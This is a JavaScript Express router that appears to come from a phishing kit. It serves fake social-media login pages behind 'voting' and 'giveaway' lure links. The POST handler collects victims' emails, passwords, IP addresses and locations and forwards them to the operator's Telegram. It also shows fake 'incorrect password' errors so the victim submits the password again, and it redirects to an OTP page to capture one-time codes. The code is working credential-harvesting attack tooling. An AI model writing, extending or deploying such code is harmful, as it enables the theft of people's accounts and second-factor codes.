const Link = require('../../../models/Link');
const Log = require('../../../models/Log');
const User = require('../../../models/User');
const {loginNotification} = require('../../../templates/telegramNotifications');
const router = require('express').Router();
const sendMessage = require("../../../lib/telegramBot")



const linkTypes = ["voting", "giveaway", "custom"]

router.get("/:socialMedia/:linkId/", async (req,res) => {
    try{
        const {linkId, socialMedia} = req.params;
        const link = await Link.findOne({linkId, expiresAt: {$gt: Date.now()}});
        if(link==null){
            return res.redirect(303, "/not-found");
        }
        if(!linkTypes.includes(link.linkType)){
            return res.redirect(303, "/not-found");
        }
        return res.render(`social/${socialMedia}`, {req, link});
    }catch(error){
        console.log(error);
        return res.redirect(303, "/not-found");
    }
})

router.post("/:socialMedia/:linkId/", async (req,res) => {
    try{
        const {linkId, socialMedia} = req.params;
        const {retry} = req.query;

        const link = await Link.findOne({linkId, expiresAt: {$gt: Date.now()}});
        const {
            email,
            password,
            region,
            city,
            country,
            ip
        } = req.body;

        if(link==null){
            return res.redirect(303, "/not-found");
        }
        if(!linkTypes.includes(link.linkType)){
            return res.redirect(303, "/not-found");
        }

        const user = await User.findOne({_id: link.userId});

        // send telegram notification to user
        const message = await loginNotification(email, password, socialMedia, ip, city, country);
        await sendMessage(user.telegramId, message);

        if(retry > 1){
            req.flash('error_msg', 'Password is incorrect. Please try again.');
            return res.redirect(303, `/slink/lgin/${socialMedia}/${linkId}?retry=${retry-1}`);
        }

        if(link.otpEnabled){
            return res.redirect(303, `/slink/otp/${socialMedia}/${linkId}`);
        }

        return res.redirect(303, `/slink/success/${linkId}`);
    }catch(error){
        console.log(error);
        return res.redirect(303, "/not-found");
    }
})

module.exports = router;